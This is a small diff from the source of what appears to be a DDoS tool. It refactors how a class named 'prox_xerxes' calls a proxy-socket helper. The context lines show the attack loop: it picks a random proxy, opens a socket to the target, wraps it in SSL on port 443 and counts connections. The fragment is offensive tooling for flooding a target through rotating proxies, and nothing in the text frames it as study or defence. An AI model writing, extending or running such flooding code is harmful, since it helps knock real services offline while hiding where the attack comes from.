@@ -52,7 +52,7 @@ class prox_xerxes(DDoS_Class):
                     break
                 proxy=random.choice(self.proxies)
                 try:
-                    s=get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
+                    s=Proxies_Getter.get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
                     if self.port==443 or self.ssl_on==True:
                         s=wrap_socket_with_ssl(s,self.target)
                     self.counter += 1
